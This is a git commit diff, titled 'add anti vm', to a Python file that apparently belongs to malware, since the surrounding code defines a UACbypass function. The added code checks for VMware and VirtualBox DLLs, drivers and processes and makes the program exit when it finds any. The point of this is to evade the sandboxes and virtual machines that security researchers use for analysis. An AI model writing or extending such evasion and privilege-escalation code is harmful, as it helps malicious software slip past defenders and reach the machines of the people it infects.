d17232788dc4837b96ba8cd835427a923b1ba5d0
whois-hoeless <whois@hoeless.com>
2023-07-27 19:26:17 +0200

    add anti vm

--- source.py
+++ source.py
@@ -32,6 +32,39 @@ import time
 import ctypes
 import re
 import json
+import psutil
+
+
+
+def is_running_in_vm():
+    vm_files = [
+        "C:\\windows\\system32\\vmGuestLib.dll",
+        "C:\\windows\\system32\\vm3dgl.dll",
+        "C:\\windows\\system32\\vboxhook.dll",
+        "C:\\windows\\system32\\vboxmrxnp.dll",
+        "C:\\windows\\system32\\vmsrvc.dll",
+        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+    ]
+    vm_processes = [ # these are vmware but might add other ones later if I find any
+        'vmtoolsd.exe', 
+        'vmwaretray.exe', 
+        'vmwareuser.exe']
+
+    for process in psutil.process_iter(['pid', 'name']):
+        if process.info['name'].lower() in vm_processes:
+            return True
+    for file_path in vm_files:
+            if os.path.exists(file_path):
+                return True
+
+
+    return False
+
+if is_running_in_vm():
+    os._exit(0)
+
+
+
 
 def UACbypass(method: int = 1) -> bool:
     if GetSelf()[1]:
